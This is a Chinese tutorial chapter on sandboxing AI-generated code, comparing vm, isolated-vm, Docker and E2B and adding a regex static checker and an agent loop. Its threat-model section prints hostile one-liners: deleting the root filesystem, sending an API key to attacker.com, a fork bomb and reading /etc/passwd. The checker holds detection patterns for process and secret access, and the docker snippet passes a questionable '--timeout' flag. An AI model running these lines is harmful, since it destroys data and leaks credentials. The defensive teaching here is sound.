# 4.13 代码执行沙箱

让 Agent 生成代码并运行——这是 AI 最强大的能力之一，也是最危险的能力之一。一段恶意或出 Bug 的代码，可以删文件、访问网络、耗尽内存、无限循环占用 CPU。这一节讲怎么安全地执行 AI 生成的代码。

---

## 威胁模型：AI 生成的代码可以做什么

```javascript
// 这些 AI 随时可能生成的代码，直接 eval() 后果严重：

// 删文件
require('fs').rmSync('/', { recursive: true, force: true })

// 访问网络，发送你的环境变量
require('https').get(`https://attacker.com?key=${process.env.API_KEY}`)

// fork bomb，耗尽进程
(function f() { require('child_process').fork(__filename); f() })()

// 无限循环，耗尽 CPU
while (true) {}

// 读取敏感文件
require('fs').readFileSync('/etc/passwd', 'utf8')
```

> ⚠️ 这些不一定是故意的攻击，**普通的 Bug 就能造成同样的破坏**。Agent 生成的代码里出现 `rm -rf` 或忘写终止条件都会出问题。

---

## 四种隔离方案，安全性递增

### 方案一：`vm` 模块（Node.js 内置，安全性最低）

```javascript
const vm = require('vm')

// ❌ 不安全！vm 模块只是一个新的 JS 上下文，可以通过原型链逃逸
const result = vm.runInNewContext(code, {}, { timeout: 3000 })
```

`vm.runInNewContext` **无法防止沙箱逃逸**，攻击者可以通过 `{}.constructor.constructor` 访问真实的 `Function` 构造器，绕过限制。生产里不要用原生 `vm` 执行不可信代码。

---

### 方案二：`isolated-vm`（Node.js，安全性中等）

`isolated-vm` 使用 V8 Isolate，真正隔离内存空间，无法访问宿主进程的任何对象：

```javascript
import ivm from 'isolated-vm'

async function runInIsolate(code, { timeoutMs = 3000, memoryMb = 32 } = {}) {
  const isolate = new ivm.Isolate({ memoryLimit: memoryMb })
  const context = await isolate.createContext()
  const jail = context.global

  // 只注入你明确允许的 API
  await jail.set('console', new ivm.ExternalCopy({
    log: new ivm.Reference((...args) => console.log('[sandbox]', ...args))
  }).copy())

  try {
    const script = await isolate.compileScript(code)
    const result = await script.run(context, {
      timeout: timeoutMs,
      // 注意：isolated-vm 没有内置文件系统 / 网络访问，天然隔离
    })
    return { success: true, result }
  } catch (err) {
    return { success: false, error: err.message }
  } finally {
    isolate.dispose()   // 释放内存
  }
}

// 使用
const { success, result, error } = await runInIsolate(aiGeneratedCode)
```

**适合**：只需要运行 JavaScript 逻辑（数据处理、计算），不需要文件/网络。

---

### 方案三：Docker 容器（推荐用于生产）

把代码放进容器里运行，完全的 OS 级隔离：

```javascript
import { execFile } from 'child_process'
import { promisify } from 'util'
import { writeFileSync, unlinkSync } from 'fs'
import { randomUUID } from 'crypto'

const execFileAsync = promisify(execFile)

async function runInDocker(code, { timeoutSeconds = 10, language = 'node' } = {}) {
  const tmpFile = `/tmp/sandbox_${randomUUID()}.js`
  writeFileSync(tmpFile, code, 'utf8')

  try {
    const { stdout, stderr } = await execFileAsync('docker', [
      'run',
      '--rm',                           // 运行完自动删除容器
      '--network=none',                 // 禁止网络访问
      '--memory=64m',                   // 内存限制
      '--cpus=0.5',                     // CPU 限制
      '--read-only',                    // 根文件系统只读
      '--tmpfs=/tmp:size=10m',          // 临时目录限制大小
      `--ulimit=nproc=50`,             // 限制进程数（防 fork bomb）
      `-v${tmpFile}:/code.js:ro`,      // 只读挂载代码文件
      '--timeout', String(timeoutSeconds),
      'node:20-alpine',                 // 最小化 Node.js 镜像
      'node', '/code.js'
    ], { timeout: (timeoutSeconds + 2) * 1000 })

    return { success: true, stdout, stderr }
  } catch (err) {
    return { success: false, error: err.message, stderr: err.stderr }
  } finally {
    unlinkSync(tmpFile)
  }
}
```

```yaml
# docker-compose 预先拉取镜像，生产里不要临时 pull
services:
  code-sandbox:
    image: node:20-alpine
    read_only: true
    network_mode: none
    mem_limit: 64m
    cpus: 0.5
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL   # 去掉所有 Linux 能力，最小权限
```

**适合**：需要文件操作、需要支持多语言（Python/Node/Ruby）、生产环境。

---

### 方案四：E2B 云沙箱（推荐用于快速上线）

[E2B](https://e2b.dev) 是专门为 AI 代码执行设计的云沙箱服务，不需要自己管理容器：

```javascript
import { Sandbox } from '@e2b/sdk'

async function runWithE2B(code) {
  const sandbox = await Sandbox.create('base')   // 或 'python'、'nodejs' 等预设模板

  try {
    const execution = await sandbox.notebook.execCell(code)
    return {
      stdout: execution.logs.stdout.join('\n'),
      stderr: execution.logs.stderr.join('\n'),
      results: execution.results,   // 图表、数据帧等结构化结果
      error: execution.error
    }
  } finally {
    await sandbox.close()
  }
}
```

**适合**：快速原型、需要 Python 数据分析生态（pandas/matplotlib）、不想自己运维容器基础设施。

---

## 代码执行前的静态检查

不管用哪种沙箱，执行前先做一层**静态检查**，拦住最明显的危险模式：

```javascript
function staticCodeCheck(code, language = 'javascript') {
  const issues = []

  if (language === 'javascript') {
    const dangerous = [
      { pattern: /require\s*\(\s*['"]child_process['"]/,  msg: '不允许执行子进程' },
      { pattern: /process\.env/,                           msg: '不允许访问环境变量' },
      { pattern: /\beval\s*\(/,                             msg: '不允许动态 eval' },
      { pattern: /require\s*\(\s*['"]fs['"]/,              msg: '不允许文件系统操作' },
      { pattern: /require\s*\(\s*['"]net['"]/,             msg: '不允许网络操作' },
      { pattern: /while\s*\(\s*true\s*\)/,                 msg: '检测到可能的无限循环' },
    ]

    for (const { pattern, msg } of dangerous) {
      if (pattern.test(code)) issues.push(msg)
    }
  }

  if (language === 'python') {
    const dangerous = [
      { pattern: /import\s+os/,       msg: '不允许 os 模块' },
      { pattern: /import\s+subprocess/,msg: '不允许 subprocess' },
      { pattern: /open\s*\(/,         msg: '不允许文件操作' },
      { pattern: /__import__/,        msg: '不允许动态 import' },
    ]
    for (const { pattern, msg } of dangerous) {
      if (pattern.test(code)) issues.push(msg)
    }
  }

  return { safe: issues.length === 0, issues }
}
```

> ⚠️ 静态检查是**第一道门**，无法替代沙箱隔离。聪明的代码可以绕过正则检查（比如把 `child_process` 拆开拼接）。**两道防线都要有**。

---

## 完整的代码执行 Agent 示例

```javascript
async function codeInterpreterAgent(userRequest) {
  const messages = [
    {
      role: 'system',
      content: `你是一个数据分析助手。用 JavaScript 写代码解决用户问题。
代码要求：
- 只用纯计算逻辑（数学、字符串处理、数据分析）
- 不能访问文件系统、网络、进程
- 最后用 console.log 输出结果
- 变量不要用 process、require、eval`
    },
    { role: 'user', content: userRequest }
  ]

  for (let round = 0; round < 3; round++) {
    const res = await client.chat.completions.create({
      model: MODEL, messages,
      tools: [{
        type: 'function',
        function: {
          name: 'execute_code',
          description: '执行 JavaScript 代码并返回结果',
          parameters: {
            type: 'object',
            properties: {
              code: { type: 'string', description: '要执行的 JavaScript 代码' }
            },
            required: ['code']
          }
        }
      }]
    })

    const msg = res.choices[0].message
    if (!msg.tool_calls) return msg.content   // 没有调用工具 = 直接给出结论

    for (const call of msg.tool_calls) {
      const { code } = JSON.parse(call.function.arguments)

      // 静态检查 + 沙箱执行
      const check = staticCodeCheck(code)
      let toolResult

      if (!check.safe) {
        toolResult = `代码安全检查未通过：${check.issues.join('；')}`
      } else {
        const { success, stdout, error } = await runInIsolate(code)
        toolResult = success ? stdout : `执行错误：${error}`
      }

      messages.push(msg)   // 把模型的 tool_calls 消息加入历史
      messages.push({
        role: 'tool',
        tool_call_id: call.id,
        content: toolResult
      })
    }
  }

  // 超过轮次，让模型用已有信息作答
  const final = await client.chat.completions.create({ model: MODEL, messages })
  return final.choices[0].message.content
}

// 测试
const answer = await codeInterpreterAgent('帮我计算 1 到 100 的所有质数，并求它们的和')
console.log(answer)
```

---

## 选型对比

| | vm（原生）| isolated-vm | Docker | E2B |
|--|---------|------------|--------|-----|
| 安全性 | ❌ 可逃逸 | ✅ V8 隔离 | ✅✅ OS 隔离 | ✅✅ 托管沙箱 |
| 网络隔离 | ❌ | ✅ | ✅ | ✅ |
| 文件系统隔离 | ❌ | ✅ | ✅ | ✅ |
| 多语言支持 | JS only | JS only | 任意 | Python/JS/等 |
| 运维成本 | 无 | 无 | 需要运维 | 无（托管） |
| 延迟 | 最低 | 低 | 中（冷启动） | 中（云） |
| 成本 | 免费 | 免费 | 服务器成本 | 按量付费 |
| 适合 | 不建议用 | JS 计算任务 | 生产，多语言 | 快速上线 |

---

## 🛠️ 实战练习：实现最小代码执行 Agent

1. 安装 `isolated-vm`（`pnpm add isolated-vm`）
2. 实现 `runInIsolate` 函数（见上），加 3 秒超时和 32MB 内存限制
3. 配合上面的 `codeInterpreterAgent`，测试以下请求：
   - "计算 1000 以内所有能被 3 和 7 整除的数之和"（正常运行）
   - "用代码读取我的环境变量"（应被静态检查拦截）
   - "死循环测试"（应被超时拦截）

**期望结果**：正常计算请求能运行，危险代码在静态检查或超时阶段被拦截，Agent 根据执行结果给出正确答案。

---

## 📌 关键结论

1. 直接 `eval()` 或 Node.js 原生 `vm` 模块都不安全，不能用于执行 AI 生成的代码
2. `isolated-vm` 提供真正的 V8 内存隔离，适合 JavaScript 纯计算任务
3. Docker 提供 OS 级隔离 + 多语言支持，是生产环境的标准方案
4. 静态检查是第一道门，无法替代沙箱，两者必须叠加
5. 执行 Agent 要设超时、内存限制、无网络、无文件系统四道限制缺一不可

---

下一节：[第 5 章 · 四大专题深入](/ch5-deep-dives/)
